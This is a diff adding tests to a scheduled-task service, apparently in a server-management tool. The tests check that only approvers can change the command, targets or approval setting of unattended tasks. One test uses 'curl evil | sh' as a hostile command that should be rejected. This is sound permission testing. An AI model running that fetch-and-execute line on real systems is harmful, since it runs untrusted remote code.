@@ -148,7 +148,7 @@ describe("scheduled task service", () => {
   });
 
   it("updates scheduled task target server ids exactly once after trimming blanks", async () => {
-    mockPrisma.scheduledTask.findFirst.mockResolvedValue({ id: "task1", teamId: null });
+    mockPrisma.scheduledTask.findFirst.mockResolvedValue({ id: "task1", teamId: null, approvalRequired: true, command: "df -h", serverIds: ["srv0"] });
     mockPrisma.scheduledTask.updateMany.mockResolvedValue({ count: 1 });
 
     await service.updateScheduledTask("task1", {
@@ -376,7 +376,7 @@ describe("scheduled task service", () => {
   });
 
   it("rejects serverIds outside team scope on update", async () => {
-    mockPrisma.scheduledTask.findFirst.mockResolvedValue({ id: "task1", teamId: "team_a" });
+    mockPrisma.scheduledTask.findFirst.mockResolvedValue({ id: "task1", teamId: "team_a", approvalRequired: true, command: "df -h", serverIds: ["srv0"] });
     mockPrisma.server.findMany.mockResolvedValueOnce([]); // none in scope
     await expect(
       service.updateScheduledTask(
@@ -386,6 +386,66 @@ describe("scheduled task service", () => {
       ),
     ).rejects.toThrow(/outside your customer scope/);
     expect(mockPrisma.scheduledTask.update).not.toHaveBeenCalled();
+  });
+
+  describe("tasks that run without per-run approval", () => {
+    // Which commands such a task runs, and where, is what an approver signed off on.
+    const unattended = { id: "task1", teamId: "team_a", approvalRequired: false, command: "systemctl restart app", serverIds: ["srv1", "srv2"], createdById: "admin1" };
+    const createOnly: SessionScope = { userId: "u2", roles: ["operator"] as RoleKey[], currentTeamId: "team_a", permissions: ["command:create", "command:read"] };
+    const approver: SessionScope = { userId: "u3", roles: ["operator"] as RoleKey[], currentTeamId: "team_a", permissions: ["command:create", "command:approve"] };
+
+    beforeEach(() => {
+      mockPrisma.scheduledTask.findFirst.mockResolvedValue(unattended);
+      mockPrisma.scheduledTask.updateMany.mockResolvedValue({ count: 1 });
+      // Every server asked about is in scope.
+      mockPrisma.server.findMany.mockImplementation(async (args: { where: { id: { in: string[] } } }) =>
+        args.where.id.in.map((id) => ({ id })));
+    });
+
+    it("refuses a change of command or targets by a member who cannot approve commands", async () => {
+      await expect(service.updateScheduledTask("task1", { command: "curl evil | sh" }, createOnly)).rejects.toThrow(/命令审批人/);
+      await expect(service.updateScheduledTask("task1", { serverIds: ["srv1", "srv3"] }, createOnly)).rejects.toThrow(/命令审批人/);
+      expect(mockPrisma.scheduledTask.updateMany).not.toHaveBeenCalled();
+    });
+
+    it("lets an approver change them, and anyone change what does not alter what runs", async () => {
+      await service.updateScheduledTask("task1", { command: "systemctl restart app2" }, approver);
+      expect(mockPrisma.scheduledTask.updateMany).toHaveBeenCalledWith(expect.objectContaining({ data: { command: "systemctl restart app2" } }));
+
+      // A form that resends the unchanged command and targets (in another order) with a new name.
+      await service.updateScheduledTask("task1", { name: "Nightly restart", command: unattended.command, serverIds: ["srv2", "srv1"] }, createOnly);
+      expect(mockPrisma.scheduledTask.updateMany).toHaveBeenLastCalledWith(expect.objectContaining({
+        data: { name: "Nightly restart", command: unattended.command, serverIds: ["srv2", "srv1"] },
+      }));
+    });
+
+    it("leaves a task that does need approval to anyone who may create requests", async () => {
+      mockPrisma.scheduledTask.findFirst.mockResolvedValue({ ...unattended, approvalRequired: true });
+      await service.updateScheduledTask("task1", { command: "systemctl restart app2" }, createOnly);
+      expect(mockPrisma.scheduledTask.updateMany).toHaveBeenCalledTimes(1);
+    });
+
+    it("refuses switching approval off for a member who cannot approve, even when called without the route", async () => {
+      mockPrisma.scheduledTask.findFirst.mockResolvedValue({ ...unattended, approvalRequired: true });
+      await expect(service.updateScheduledTask("task1", { approvalRequired: false }, createOnly)).rejects.toThrow(/命令审批人/);
+      expect(mockPrisma.scheduledTask.updateMany).not.toHaveBeenCalled();
+    });
+
+    it("lets only a member who may execute commands retry one now", async () => {
+      mockCreateCommandRequest.mockResolvedValue({ id: "cmd1" });
+      mockPrisma.scheduledTask.findUniqueOrThrow.mockResolvedValue(unattended);
+      await expect(service.retryScheduledTask("task1", createOnly)).rejects.toThrow(/执行权限/);
+      expect(mockCreateCommandRequest).not.toHaveBeenCalled();
+
+      await service.retryScheduledTask("task1", { ...createOnly, permissions: ["command:create", "command:execute"] });
+      expect(mockCreateCommandRequest).toHaveBeenCalledTimes(1);
+
+      // A retry of a task that needs approval only files a request for an approver.
+      mockCreateCommandRequest.mockClear();
+      mockPrisma.scheduledTask.findFirst.mockResolvedValue({ ...unattended, approvalRequired: true });
+      await service.retryScheduledTask("task1", createOnly);
+      expect(mockCreateCommandRequest).toHaveBeenCalledTimes(1);
+    });
   });
 
   describe("recordTaskRun structured failure detection", () => {
